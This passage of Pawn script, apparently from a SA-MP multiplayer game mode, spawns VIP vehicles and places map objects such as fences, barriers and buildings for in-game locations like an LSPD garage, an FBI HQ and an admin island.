	VIPCar[16] = CreateVehicle(477,3100.0764,-1117.7511,8.3261,359.3659,109,57,1800); //
	VIPCar[17] = CreateVehicle(477,3096.8154,-1117.7874,8.3304,0.5216,113,126,1800); //
	VIPCar[18] = CreateVehicle(494,3093.6863,-1117.6470,8.4735,359.5623,34,71,1800); //
	VIPCar[19] = CreateVehicle(494,3090.6030,-1118.2177,8.4731,358.6407,75,121,1800); //
	VIPCar[20] = CreateVehicle(494,3087.2820,-1118.2936,8.4732,359.9474,15,70,1800); //
	VIPCar[21] = CreateVehicle(504,3084.0513,-1118.6730,8.3704,359.7321,126,0,1800); //
	VIPCar[22] = CreateVehicle(504,3080.7932,-1118.6998,8.3706,359.0336,10,41,1800); //
	VIPCar[23] = CreateVehicle(504,3080.7559,-1108.7924,8.3706,177.5326,2,87,1800); //
	VIPCar[24] = CreateVehicle(504,3084.3345,-1107.7146,8.3731,179.0387,38,78,1800); //
	VIPCar[25] = CreateVehicle(506,3087.3015,-1108.0320,8.2827,178.1118,58,23,1800); //
	VIPCar[26] = CreateVehicle(556,3091.7283,-1106.4137,8.9531,178.3062,13,24,1800); //
	VIPCar[27] = CreateVehicle(556,3097.0247,-1106.1466,8.9494,178.2268,52,71,1800); //
	VIPCar[28] = CreateVehicle(556,3101.3162,-1106.2876,8.9472,178.1615,121,82,1800); //
	print("Static vehicles loaded.");
	return 1;
}
stock LoadObjects() // Objects
{

	LSPDBarrier = CreateDynamicObject(968, 1544.6943359375, -1630.73046875, 13.27956199646, 0.000000, 90, 90); // LSPD Barrier
	LSPDGate =  CreateDynamicObject(971, 1588.6428222656, -1638.02734375, 15.240161895752, 0, 0, 181.03271484375); // LSPD Gate
	// North LS Gas Station
	CreateDynamicObject(1676,998.63592529,-937.55993652,42.83398819,0.00000000,0.00000000,8.75000000); //object(washgaspump) (1)
	CreateDynamicObject(1676,1002.15386963,-937.07757568,42.83398819,0.00000000,0.00000000,8.74511719); //object(washgaspump) (2)
	CreateDynamicObject(1676,1005.69854736,-936.55706787,42.83398819,0.00000000,0.00000000,8.74511719); //object(washgaspump) (3)
	CreateDynamicObject(1676,1009.05902100,-936.06591797,42.83398819,0.00000000,0.00000000,8.74511719); //object(washgaspump) (4)
	CreateDynamicObject(997,1007.79016113,-936.89746094,41.40344238,0.00000000,0.00000000,8.50000000); //object(lhouse_barrier3) (1)
	CreateDynamicObject(997,1004.13403320,-937.44079590,41.40344238,0.00000000,0.00000000,7.99792480); //object(lhouse_barrier3) (2)
	CreateDynamicObject(997,1000.84777832,-937.91687012,41.40344238,0.00000000,0.00000000,8.24255371); //object(lhouse_barrier3) (3)
	CreateDynamicObject(997,997.16809082,-938.39813232,41.40344238,0.00000000,0.00000000,7.73974609); //object(lhouse_barrier3) (4)
	CreateDynamicObject(997,1007.56115723,-935.66760254,41.40344238,0.00000000,0.00000000,8.49792480); //object(lhouse_barrier3) (5)
	CreateDynamicObject(997,1003.90948486,-936.23516846,41.40344238,0.00000000,0.00000000,7.99255371); //object(lhouse_barrier3) (6)
	CreateDynamicObject(997,1000.61877441,-936.68615723,41.40344238,0.00000000,0.00000000,8.23974609); //object(lhouse_barrier3) (7)
	CreateDynamicObject(997,996.94824219,-937.21679688,41.40344238,0.00000000,0.00000000,7.73437500); //object(lhouse_barrier3) (8)

	// Cocaine Lab Fixes - Credts to NGG
	CreateDynamicObject(7191,2338.39135742,-1182.56323242,1032.95129395,90.00000000,0.00000000,90.00000000, -1, 5); //object(vegasnnewfence2b)(1)
	CreateDynamicObject(13656,2292.93872070,-1132.04724121,1017.29772949,0.00000000,0.00000000,0.00000000, -1, 5); //object(fuckknows)(1)
	CreateDynamicObject(7191,2337.95458984,-1182.54309082,1032.95129395,90.00000000,0.00000000,90.00000000, -1, 5); //object(vegasnnewfence2b)(2)
	CreateDynamicObject(7191,2338.43408203,-1182.39440918,1032.95129395,90.00000000,180.00000000,90.24850464, -1, 5); //object(vegasnnewfence2b)(3)
	CreateDynamicObject(7191,2337.97314453,-1182.39111328,1032.95129395,90.00000000,179.99450684,90.24719238, -1, 5); //object(vegasnnewfence2b)(4)
	CreateDynamicObject(7191,2328.80346680,-1180.43066406,1034.70544434,0.00000000,270.00000000,88.50006104, -1, 5); //object(vegasnnewfence2b)(5)
	CreateDynamicObject(3055,2319.78198242,-1184.82641602,1032.36450195,63.75003052,269.99996948,178.5001220, -1, 5); //object(kmb_shutter)(1)
	CreateDynamicObject(7191,2328.83715820,-1186.81262207,1030.70446777,0.00000000,90.74990845,359.99481201, -1, 5); //object(vegasnnewfence2b)(6)
	CreateDynamicObject(7191,2326.84863281,-1187.03125000,1030.70446777,0.00000000,90.74707031,359.99450684, -1, 5); //object(vegasnnewfence2b)(8)
	CreateDynamicObject(7191,2337.31689453,-1186.55639648,1030.70446777,0.00000000,90.74707031,359.99450684, -1, 5); //object(vegasnnewfence2b)(9)
	CreateDynamicObject(7191,2339.06689453,-1186.13159180,1030.70446777,0.00000000,91.24694824,359.99453735, -1, 5); //object(vegasnnewfence2b)(10)
	CreateDynamicObject(7191,2338.39062500,-1182.56250000,1032.95129395,90.00000000,0.00000000,90.00000000, -1, 5); //object(vegasnnewfence2b)(11)
	CreateDynamicObject(7191,2337.95947266,-1179.38879395,1032.95129395,90.00000000,180.00000000,270.00000000, -1, 5); //object(vegasnnewfence2b)(12)
	CreateDynamicObject(7191,2338.38476562,-1179.43066406,1032.95129395,90.00000000,0.00000000,90.00000000, -1, 5); //object(vegasnnewfence2b)(13)
	CreateDynamicObject(7191,2337.96630859,-1179.23559570,1032.95129395,90.00000000,179.99450684,90.24719238, -1, 5); //object(vegasnnewfence2b)(14)

 	// Idlewood Gas Station Fences
	CreateDynamicObject(970,1942.48376465,-1766.52941895,12.94207954,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (1)
	CreateDynamicObject(970,1942.48632812,-1770.73071289,12.94207954,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (2)
	CreateDynamicObject(970,1942.49255371,-1774.95690918,12.94207954,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (3)
	CreateDynamicObject(970,1942.50024414,-1779.18383789,12.94207954,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (4)
	CreateDynamicObject(970,1940.84838867,-1779.14770508,12.94207954,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (5)
	CreateDynamicObject(970,1940.82446289,-1774.85656738,12.94207954,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (6)
	CreateDynamicObject(970,1940.81445312,-1770.59240723,12.94207954,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (7)
	CreateDynamicObject(970,1940.82299805,-1766.36853027,12.94207954,0.00000000,0.00000000,270.00000000); //object(fencesmallb) (8)
	CreateDynamicObject(1569,1564.05126953,-1667.39648438,27.39560699,0.00000000,0.00000000,0.00000000); //object(adam_v_door) (1)

	// LSPD Exterior & Garage
	CreateDynamicObject(970,1544.79089355,-1637.28112793,27.95359612,0.00000000,0.00000000,0.00000000); //DynamicObject(fencesmallb) (1)
	CreateDynamicObject(970,1549.14111328,-1637.28027344,27.95359612,0.00000000,0.00000000,0.00000000); //DynamicObject(fencesmallb) (2)
	CreateDynamicObject(970,1553.41735840,-1637.28027344,27.95359612,0.00000000,0.00000000,0.00000000); //DynamicObject(fencesmallb) (3)
	CreateDynamicObject(970,1557.76708984,-1637.28027344,27.95359612,0.00000000,0.00000000,0.00000000); //DynamicObject(fencesmallb) (4)
	CreateDynamicObject(970,1561.96630859,-1637.28027344,27.95359612,0.00000000,0.00000000,0.00000000); //DynamicObject(fencesmallb) (5)
	CreateDynamicObject(970,1566.21630859,-1637.28027344,27.95359612,0.00000000,0.00000000,0.00000000); //DynamicObject(fencesmallb) (6)
	CreateDynamicObject(970,1570.46606445,-1637.28027344,27.95359612,0.00000000,0.00000000,0.00000000); //DynamicObject(fencesmallb) (7)
	CreateDynamicObject(970,1574.74133301,-1637.28027344,27.95359612,0.00000000,0.00000000,0.00000000); //DynamicObject(fencesmallb) (8)
	CreateDynamicObject(970,1577.80664062,-1639.56396484,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (9)
	CreateDynamicObject(970,1577.79174805,-1643.91601562,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (10)
	CreateDynamicObject(970,1577.80053711,-1648.26770020,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (11)
	CreateDynamicObject(970,1577.81018066,-1652.56835938,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (12)
	CreateDynamicObject(970,1577.82360840,-1656.86816406,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (13)
	CreateDynamicObject(970,1577.86291504,-1661.11816406,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (14)
	CreateDynamicObject(970,1577.85290527,-1665.40075684,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (15)
	CreateDynamicObject(970,1577.84338379,-1669.75097656,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (16)
	CreateDynamicObject(970,1577.83422852,-1674.00170898,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (17)
	CreateDynamicObject(970,1577.82177734,-1678.25024414,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (18)
	CreateDynamicObject(970,1577.81457520,-1682.47644043,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (19)
	CreateDynamicObject(970,1577.80590820,-1686.72631836,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (20)
	CreateDynamicObject(970,1577.79833984,-1690.92675781,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (21)
	CreateDynamicObject(970,1577.78869629,-1695.12719727,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (22)
	CreateDynamicObject(970,1577.77587891,-1699.32617188,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (23)
	CreateDynamicObject(970,1577.76440430,-1703.57592773,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (24)
	CreateDynamicObject(970,1577.75207520,-1707.79968262,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (25)
	CreateDynamicObject(970,1577.74096680,-1712.07360840,27.95359612,0.00000000,0.00000000,270.00000000); //DynamicObject(fencesmallb) (26)
	CreateDynamicObject(970,1575.26379395,-1714.37219238,27.95359612,0.00000000,0.00000000,180.00000000); //DynamicObject(fencesmallb) (27)
	CreateDynamicObject(970,1570.98278809,-1714.34692383,27.95359612,0.00000000,0.00000000,179.99450684); //DynamicObject(fencesmallb) (28)
	CreateDynamicObject(970,1566.72412109,-1714.34838867,27.95359612,0.00000000,0.00000000,179.99450684); //DynamicObject(fencesmallb) (29)
	CreateDynamicObject(970,1562.49572754,-1714.34582520,27.95359612,0.00000000,0.00000000,179.99450684); //DynamicObject(fencesmallb) (30)
	CreateDynamicObject(970,1558.26892090,-1714.34130859,27.95359612,0.00000000,0.00000000,179.99450684); //DynamicObject(fencesmallb) (31)
	CreateDynamicObject(970,1554.04333496,-1714.33496094,27.95359612,0.00000000,0.00000000,179.99450684); //DynamicObject(fencesmallb) (32)
	CreateDynamicObject(970,1549.81799316,-1714.32873535,27.95359612,0.00000000,0.00000000,179.99450684); //DynamicObject(fencesmallb) (33)
	CreateDynamicObject(970,1545.59289551,-1714.32116699,27.95359612,0.00000000,0.00000000,179.99450684); //DynamicObject(fencesmallb) (34)
	CreateDynamicObject(970,1542.66857910,-1711.92492676,27.95359612,0.00000000,0.00000000,89.99450684); //DynamicObject(fencesmallb) (35)
	CreateDynamicObject(970,1542.66015625,-1707.70080566,27.95359612,0.00000000,0.00000000,89.99450684); //DynamicObject(fencesmallb) (36)
	CreateDynamicObject(970,1542.64746094,-1703.47424316,27.95359612,0.00000000,0.00000000,89.99450684); //DynamicObject(fencesmallb) (37)
	CreateDynamicObject(970,1546.46936035,-1700.84899902,27.95359612,0.00000000,0.00000000,359.99450684); //DynamicObject(fencesmallb) (38)
	CreateDynamicObject(970,1550.74743652,-1700.83483887,27.95359612,0.00000000,0.00000000,359.98901367); //DynamicObject(fencesmallb) (39)
	CreateDynamicObject(970,1553.63476562,-1698.10791016,27.95359612,0.00000000,0.00000000,269.98901367); //DynamicObject(fencesmallb) (40)
	CreateDynamicObject(970,1553.62658691,-1693.77722168,27.95359612,0.00000000,0.00000000,269.98901367); //DynamicObject(fencesmallb) (41)
	CreateDynamicObject(970,1553.60217285,-1689.51794434,27.95359612,0.00000000,0.00000000,269.98901367); //DynamicObject(fencesmallb) (42)
	CreateDynamicObject(970,1553.59069824,-1685.26623535,27.95359612,0.00000000,0.00000000,269.98901367); //DynamicObject(fencesmallb) (43)
	CreateDynamicObject(970,1553.57897949,-1681.04003906,27.95359612,0.00000000,0.00000000,269.98901367); //DynamicObject(fencesmallb) (44)
	CreateDynamicObject(970,1553.58093262,-1670.81103516,27.95359612,0.00000000,0.00000000,269.98901367); //DynamicObject(fencesmallb) (45)
	CreateDynamicObject(970,1553.56982422,-1666.50891113,27.95359612,0.00000000,0.00000000,269.98901367); //DynamicObject(fencesmallb) (46)
	CreateDynamicObject(970,1553.53320312,-1662.25659180,27.95359612,0.00000000,0.00000000,269.98901367); //DynamicObject(fencesmallb) (47)
	CreateDynamicObject(970,1553.54724121,-1658.03039551,27.95359612,0.00000000,0.00000000,269.98901367); //DynamicObject(fencesmallb) (48)
	CreateDynamicObject(970,1553.53686523,-1653.75488281,27.95359612,0.00000000,0.00000000,269.98901367); //DynamicObject(fencesmallb) (49)
	CreateDynamicObject(970,1550.29052734,-1650.73937988,27.95359612,0.00000000,0.00000000,179.98901367); //DynamicObject(fencesmallb) (50)
	CreateDynamicObject(970,1545.93115234,-1650.77368164,27.95359612,0.00000000,0.00000000,179.98352051); //DynamicObject(fencesmallb) (51)
	CreateDynamicObject(970,1542.56152344,-1648.35388184,27.95359612,0.00000000,0.00000000,89.98352051); //DynamicObject(fencesmallb) (52)
	CreateDynamicObject(970,1542.55651855,-1644.07580566,27.95359612,0.00000000,0.00000000,89.98352051); //DynamicObject(fencesmallb) (53)
	CreateDynamicObject(970,1542.54882812,-1639.84790039,27.95359612,0.00000000,0.00000000,89.98352051); //DynamicObject(fencesmallb) (54)
	CreateDynamicObject(1215,1542.68469238,-1637.52331543,27.96643829,0.00000000,0.00000000,0.00000000); //DynamicObject(bollardlight) (1)
	CreateDynamicObject(1215,1577.41918945,-1637.37463379,27.96643829,0.00000000,0.00000000,0.00000000); //DynamicObject(bollardlight) (2)
	CreateDynamicObject(1215,1543.00610352,-1650.63269043,27.96643829,0.00000000,0.00000000,0.00000000); //DynamicObject(bollardlight) (3)
	CreateDynamicObject(1215,1553.51025391,-1650.73876953,27.96643829,0.00000000,0.00000000,0.00000000); //DynamicObject(bollardlight) (4)
	CreateDynamicObject(1215,1553.87353516,-1678.61999512,27.96643829,0.00000000,0.00000000,0.00000000); //DynamicObject(bollardlight) (5)
	CreateDynamicObject(1215,1553.90393066,-1672.60510254,27.96643829,0.00000000,0.00000000,0.00000000); //DynamicObject(bollardlight) (6)
	CreateDynamicObject(1215,1553.38757324,-1700.83959961,27.96643829,0.00000000,0.00000000,0.00000000); //DynamicObject(bollardlight) (7)
	CreateDynamicObject(1215,1543.25537109,-1700.90600586,27.96643829,0.00000000,0.00000000,0.00000000); //DynamicObject(bollardlight) (8)
	CreateDynamicObject(1215,1542.91027832,-1714.26464844,27.96643829,0.00000000,0.00000000,0.00000000); //DynamicObject(bollardlight) (9)
	CreateDynamicObject(1215,1577.68847656,-1714.46398926,27.96643829,0.00000000,0.00000000,0.00000000); //DynamicObject(bollardlight) (10)
	CreateDynamicObject(970,1553.58093262,-1670.81103516,27.95359612,0.00000000,0.00000000,269.98901367); //DynamicObject(fencesmallb) (55)
	CreateDynamicObject(983,1544.67871094,-1620.55090332,13.06636715,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (1)
	CreateDynamicObject(983,1544.66882324,-1635.94934082,13.06636715,0.00000000,0.00000000,0.00000000); //object(fenceshit3) (2)
	CreateDynamicObject(1495,1582.60693359,-1637.98974609,12.39045906,0.00000000,0.00000000,0.00000000); //object(gen_doorext01) (1)

	// New FBI HQ Exterior
	CreateDynamicObject(19355, 1791.95728, -1300.32703, 17.32804,   0.00000, 0.00000, -57.00000);
    CreateDynamicObject(19355, 1795.37012, -1298.22107, 13.85400,   0.00000, 0.00000, -54.00000);
    CreateDynamicObject(19355, 1792.65564, -1299.93262, 13.95299,   0.00000, 0.00000, -57.00000);
    CreateDynamicObject(19355, 1791.95728, -1300.32703, 13.95299,   0.00000, 0.00000, -57.00000);
    CreateDynamicObject(19355, 1792.65564, -1299.93262, 17.34181,   0.00000, 0.00000, -57.00000);
    CreateDynamicObject(19355, 1795.37012, -1298.22107, 17.29100,   0.00000, 0.00000, -54.00000);
    CreateDynamicObject(19355, 1780.99792, -1298.72180, 17.43609,   0.00000, 0.00000, 218.75681);
    CreateDynamicObject(19355, 1782.14331, -1299.81543, 17.36691,   0.00000, 0.00000, 218.75681);
    CreateDynamicObject(19355, 1782.14331, -1299.81543, 13.95300,   0.00000, 0.00000, 218.75681);
    CreateDynamicObject(19355, 1780.99792, -1298.72180, 13.95300,   0.00000, 0.00000, 218.75681);
    CreateDynamicObject(19121, 1793.20459, -1285.37537, 13.19619,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1798.04199, -1289.99182, 13.19519,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1790.54553, -1287.46680, 13.19619,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1787.70410, -1289.63330, 13.19619,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1784.69202, -1291.61365, 13.19619,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1781.88208, -1293.20630, 13.19619,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1779.17944, -1294.79346, 13.19619,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1795.25708, -1283.71411, 13.19519,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1796.72778, -1286.71973, 13.19519,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1799.27100, -1295.21008, 13.19519,   0.00000, 0.00000, 0.00000);
    CreateDynamicObject(19121, 1798.87463, -1292.34827, 13.19520,   0.00000, 0.00000, 0.00000);
    
    	//Admin Island Map
    CreateDynamicObject(3069,2893.8476600,-1650.7460900,9.3994400,7.2399900,0.0000000,252.7459700); //
	CreateDynamicObject(7020,3326.1738300,-1765.9150400,8.9205500,0.0000000,0.0000000,342.4932900); //
	CreateDynamicObject(7020,3315.7343800,-1798.9960900,8.9205500,0.0000000,0.0000000,342.4932900); //
	CreateDynamicObject(7020,3305.2822300,-1832.0947300,8.9205500,0.0000000,0.0000000,342.4932900); //
	CreateDynamicObject(7020,3336.7705100,-1732.8886700,8.9205500,0.0000000,0.0000000,342.4932900); //
	CreateDynamicObject(7020,3294.8300800,-1865.1084000,8.9205500,0.0000000,0.0000000,342.4932900); //
	CreateDynamicObject(7020,3390.0605500,-1749.7645300,8.9205500,0.0000000,0.0000000,342.4932900); //
	CreateDynamicObject(7020,3379.6748000,-1782.9052700,8.9205500,0.0000000,0.0000000,342.4932900); //
	CreateDynamicObject(7020,3369.1523400,-1815.9753400,8.9205500,0.0000000,0.0000000,342.4932900); //
	CreateDynamicObject(7020,3358.7890600,-1849.0189200,8.9205500,0.0000000,0.0000000,342.4932900); //
	CreateDynamicObject(7020,3348.3408200,-1881.9931600,8.9205500,0.0000000,0.0000000,342.4932900); //
	CreateDynamicObject(9482,3304.6845700,-1777.2285200,17.2194800,0.0000000,0.0000000,342.4932900); //
	CreateDynamicObject(8209,3377.8974600,-1710.2788100,14.6029900,0.0000000,0.0000000,342.5000000); //
	CreateDynamicObject(8209,3421.5791000,-1775.7860100,14.6029900,0.0000000,0.0000000,252.4987800); //
	CreateDynamicObject(8209,3399.8291000,-1844.7346200,14.6029900,0.0000000,0.0000000,252.4932900); //
	CreateDynamicObject(8209,3389.6474600,-1713.7783200,14.6029900,0.0000000,0.0000000,342.4987800); //
	CreateDynamicObject(8209,3337.7597700,-1877.3974600,14.6029900,0.0000000,0.0000000,162.4987800); //
	CreateDynamicObject(8210,3322.4902300,-1722.0195300,14.6874400,0.0000000,0.0000000,72.4877900); //
	CreateDynamicObject(8210,3316.3173800,-1741.0429700,14.6874400,0.0000000,0.0000000,71.9934100); //
	CreateDynamicObject(8210,3287.3779300,-1833.0957000,14.6874400,0.0000000,0.0000000,72.4768100); //
	CreateDynamicObject(8210,3293.3281300,-1813.5195300,14.6874400,0.0000000,0.0000000,72.7404800); //
	CreateDynamicObject(10377,3374.8437500,-1799.7597700,29.4934500,0.0000000,0.0000000,162.2406000); //
	CreateDynamicObject(654,3303.1416000,-1794.9130900,11.7364200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(654,3313.2158200,-1761.5312500,11.7364200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3434,3302.8051800,-1776.7860100,36.8565700,0.0000000,0.0000000,252.7500000); //
	CreateDynamicObject(2921,3353.0688500,-1804.0139200,19.2964000,0.0000000,0.0000000,18.0000000); //
	CreateDynamicObject(2921,3359.6936000,-1783.3225100,19.2833000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(639,3281.8178700,-1861.2531700,8.0560800,0.0000000,0.0000000,72.0000000); //
	CreateDynamicObject(8853,3299.9445800,-1805.2163100,12.1267300,0.0000000,0.0000000,342.0000000); //
	CreateDynamicObject(8853,3293.4970700,-1825.0419900,12.1267300,0.0000000,0.0000000,341.9879200); //
	CreateDynamicObject(8853,3287.0478500,-1844.8920900,12.1267300,0.0000000,0.0000000,341.9989000); //
	CreateDynamicObject(8853,3303.3994100,-1863.8557100,12.1267300,0.0000000,0.0000000,251.7489000); //
	CreateDynamicObject(8853,3323.2734400,-1870.4550800,12.1267300,0.0000000,0.0000000,251.7407200); //
	CreateDynamicObject(8853,3343.1318400,-1876.9296900,12.1267300,0.0000000,0.0000000,252.2406000); //
	CreateDynamicObject(8853,3362.9316400,-1883.3053000,12.1267300,0.0000000,0.0000000,251.9935300); //
	CreateDynamicObject(8853,3373.4931600,-1886.6540500,12.1267300,0.0000000,0.0000000,252.2435300); //
	CreateDynamicObject(8853,3385.9174800,-1880.3292200,12.1267300,0.0000000,0.0000000,162.2406000); //
	CreateDynamicObject(8853,3392.2436500,-1860.5545700,12.1267300,0.0000000,0.0000000,162.2406000); //
	CreateDynamicObject(8853,3398.6196300,-1840.7293700,12.1267300,0.0000000,0.0000000,162.2406000); //
	CreateDynamicObject(8853,3404.9697300,-1820.8524200,12.1267300,0.0000000,0.0000000,162.2406000); //
	CreateDynamicObject(8853,3411.2959000,-1801.0263700,12.1267300,0.0000000,0.0000000,162.2406000); //
	CreateDynamicObject(8853,3423.9960900,-1761.2762500,12.1267300,0.0000000,0.0000000,162.2406000); //
	CreateDynamicObject(8853,3417.6455100,-1781.1524700,12.1267300,0.0000000,0.0000000,162.2406000); //
	CreateDynamicObject(8853,3430.3466800,-1741.4005100,12.1267300,0.0000000,0.0000000,162.2406000); //
	CreateDynamicObject(8853,3424.4660600,-1727.6855500,12.1267300,0.0000000,0.0000000,72.2406000); //
	CreateDynamicObject(8853,3404.6396500,-1721.3349600,12.1267300,0.0000000,0.0000000,72.2406000); //
	CreateDynamicObject(8853,3384.8408200,-1715.0097700,12.1267300,0.0000000,0.0000000,72.2406000); //
	CreateDynamicObject(8853,3364.9628900,-1708.6591800,12.1267300,0.0000000,0.0000000,72.2406000); //
	CreateDynamicObject(8853,3345.0878900,-1702.3085900,12.1267300,0.0000000,0.0000000,72.2406000); //
	CreateDynamicObject(8853,3316.5688500,-1751.5184300,12.1267300,0.0000000,0.0000000,342.2406000); //
	CreateDynamicObject(8853,3322.9169900,-1731.7172900,12.1267300,0.0000000,0.0000000,342.2351100); //
	CreateDynamicObject(8853,3329.2910200,-1711.8662100,12.1267300,0.0000000,0.0000000,342.2351100); //
	CreateDynamicObject(3471,3303.9511700,-1793.5078100,13.1132700,0.0000000,0.0000000,73.7457300); //
	CreateDynamicObject(3471,3303.9514200,-1793.5083000,13.1132700,0.0000000,0.0000000,73.7500000); //
	CreateDynamicObject(3471,3312.9003900,-1763.7327900,13.1132700,0.0000000,0.0000000,253.7457300); //
	CreateDynamicObject(14467,3358.7751500,-1778.2950400,14.5830800,0.0000000,0.0000000,251.9934100); //
	CreateDynamicObject(8991,3301.4738800,-1801.0278300,12.7647400,0.0000000,0.0000000,72.0000000); //
	CreateDynamicObject(8991,3297.8232400,-1812.0273400,12.7647400,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(8991,3293.6728500,-1824.5771500,12.7647400,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(8991,3289.8271500,-1836.4926800,12.7647400,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(8991,3286.1269500,-1848.1666300,12.7647400,0.0000000,0.0000000,71.9989000); //
	CreateDynamicObject(8991,3300.3388700,-1862.7197300,12.7647400,0.0000000,0.0000000,161.9934100); //
	CreateDynamicObject(8991,3313.0888700,-1866.9443400,12.7647400,0.0000000,0.0000000,161.9934100); //
	CreateDynamicObject(8991,3326.4873000,-1871.2188700,12.7647400,0.0000000,0.0000000,161.9934100); //
	CreateDynamicObject(8991,3337.4111300,-1874.9687500,12.7647400,0.0000000,0.0000000,161.9934100); //
	CreateDynamicObject(8991,3349.6870100,-1878.7685500,12.7647400,0.0000000,0.0000000,161.9934100); //
	CreateDynamicObject(8991,3361.0888700,-1882.6679700,12.7647400,0.0000000,0.0000000,161.9934100); //
	CreateDynamicObject(8991,3373.6894500,-1886.5178200,12.7647400,0.0000000,0.0000000,161.9934100); //
	CreateDynamicObject(8991,3376.5629900,-1887.4920700,12.7647400,0.0000000,0.0000000,161.9934100); //
	CreateDynamicObject(8991,3384.8125000,-1883.4912100,12.7647400,0.0000000,0.0000000,251.9934100); //
	CreateDynamicObject(8991,3389.0127000,-1870.0410200,12.7647400,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(8991,3392.8632800,-1857.8911100,12.7647400,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(8991,3396.7636700,-1845.6151100,12.7647400,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(8991,3400.8881800,-1833.1643100,12.7647400,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(8991,3404.9126000,-1820.4140600,12.7647400,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(8991,3408.6621100,-1808.9140600,12.7647400,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(8991,3412.7368200,-1795.9140600,12.7647400,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(8991,3416.6865200,-1783.6640600,12.7647400,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(8991,3420.8115200,-1770.6640600,12.7647400,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(8991,3424.7905300,-1758.1915300,12.7647400,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(8991,3428.5400400,-1746.4414100,12.7647400,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(8991,3431.5170900,-1736.9414100,12.7647400,0.0000000,0.0000000,251.9879200); //
	CreateDynamicObject(8991,3427.5166000,-1728.8913600,12.7647400,0.0000000,0.0000000,341.9879200); //
	CreateDynamicObject(8991,3414.5376000,-1724.6160900,12.7647400,0.0000000,0.0000000,341.9824200); //
	CreateDynamicObject(8991,3403.5371100,-1721.1903100,12.7647400,0.0000000,0.0000000,341.9824200); //
	CreateDynamicObject(8991,3391.5869100,-1717.3144500,12.7647400,0.0000000,0.0000000,341.9769300); //
	CreateDynamicObject(8991,3379.8369100,-1713.5894800,12.7647400,0.0000000,0.0000000,341.9824200); //
	CreateDynamicObject(8991,3368.5869100,-1709.8886700,12.7647400,0.0000000,0.0000000,341.9769300); //
	CreateDynamicObject(8991,3356.3867200,-1706.0888700,12.7647400,0.0000000,0.0000000,341.9824200); //
	CreateDynamicObject(8991,3345.8867200,-1702.7880900,12.7647400,0.0000000,0.0000000,341.9769300); //
	CreateDynamicObject(8991,3341.8867200,-1701.4630100,12.7647400,0.0000000,0.0000000,341.9824200); //
	CreateDynamicObject(8991,3330.6367200,-1708.2128900,12.7647400,0.0000000,0.0000000,71.9824200); //
	CreateDynamicObject(8991,3326.8867200,-1719.7128900,12.7647400,0.0000000,0.0000000,71.9824200); //
	CreateDynamicObject(8991,3322.8867200,-1732.2128900,12.7647400,0.0000000,0.0000000,71.9824200); //
	CreateDynamicObject(8991,3319.1875000,-1743.7128900,12.7647400,0.0000000,0.0000000,71.9824200); //
	CreateDynamicObject(8991,3315.6875000,-1754.4628900,12.7647400,0.0000000,0.0000000,71.9824200); //
	CreateDynamicObject(6965,3334.6689500,-1786.4863300,15.5030800,0.0000000,0.0000000,343.9984100); //
	CreateDynamicObject(9833,3334.3554700,-1786.8140900,22.1725100,0.0000000,0.0000000,37.5000000); //
	CreateDynamicObject(3115,3412.4853500,-1736.1660200,11.6447400,0.0000000,0.0000000,341.9989000); //
	CreateDynamicObject(3934,3412.7085000,-1735.6428200,11.9350100,0.0000000,0.0000000,342.0000000); //
	CreateDynamicObject(10828,3323.9453100,-1710.6626000,7.6330800,0.0000000,0.0000000,72.0000000); //
